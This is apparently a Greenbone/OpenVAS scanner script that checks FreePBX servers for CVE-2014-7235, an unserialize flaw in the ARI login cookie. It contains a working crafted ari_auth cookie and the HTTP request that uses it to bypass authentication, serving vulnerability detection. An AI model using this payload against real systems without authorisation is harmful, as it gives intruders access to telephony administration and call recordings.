CPE = "cpe:/a:freepbx:freepbx";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.105195" );
	script_bugtraq_id( 70188 );
	script_cve_id( "CVE-2014-7235" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_version( "$Revision: 13659 $" );
	script_name( "FreePBX 'index.php' Remote Command Execution Vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/70188" );
	script_xref( name: "URL", value: "http://www.freepbx.org/" );
	script_tag( name: "impact", value: "An attacker may leverage this issue to execute arbitrary commands in
the context of the affected application." );
	script_tag( name: "vuldetect", value: "Send a HTTP GET request with a special crafted cookie and check the response." );
	script_tag( name: "insight", value: "htdocs_ari/includes/login.php in the ARI Framework module/Asterisk Recording Interface (ARI) allows remote
attackers to execute arbitrary code via the ari_auth coockie, related to the PHP unserialize function, as exploited in the wild in September 2014." );
	script_tag( name: "solution", value: "Updates are available." );
	script_tag( name: "summary", value: "FreePBX is prone to a remote command-execution vulnerability because
the application fails to sufficiently sanitize input data." );
	script_tag( name: "affected", value: "FreePBX before 2.9.0.9, 2.10.x, and 2.11 before 2.11.1.5" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_active" );
	script_tag( name: "last_modification", value: "$Date: 2019-02-14 09:34:21 +0100 (Thu, 14 Feb 2019) $" );
	script_tag( name: "creation_date", value: "2015-02-06 16:04:47 +0100 (Fri, 06 Feb 2015)" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "This script is Copyright (C) 2015 Greenbone Networks GmbH" );
	script_dependencies( "gb_freepbx_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "freepbx/installed" );
	exit( 0 );
}
require("host_details.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
cookie = "ari_auth=a%3A2%3A%7Bi%3A0%3Bs%3A88%3A%22rT9bcNlEJv%2F1G9j9ZcqPUej1ntSHDwlDvrv1pphLMel2lppX43" + "z4E%2BF2Yc3In070LIWRFCh1wanriTUnYC8%2F%2Bg%3D%3D%22%3Bi%3A1%3Bs%3A32%3A%224ffe329af509978387" + "ac4af2fbb3a694%22%3B%7D";
host = http_host_name( port: port );
useragent = http_get_user_agent();
req = "GET " + dir + "/recordings/index.php HTTP/1.1\r\n" + "Host: " + host + "\r\n" + "User-Agent: " + useragent + "\r\n" + "Connection: Close\r\n" + "Accept-Charset: iso-8859-1,utf-8;q=0.9,*;q=0.1\r\n" + "Cookie:" + cookie + "\r\n" + "Accept-Language: en\r\n" + "\r\n";
result = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
if(ContainsString( result, ">Logout<" ) && ContainsString( result, ">Call Monitor<" ) && ContainsString( result, ">Voicemail<" )){
	security_message( port: port );
	exit( 0 );
}
exit( 99 );

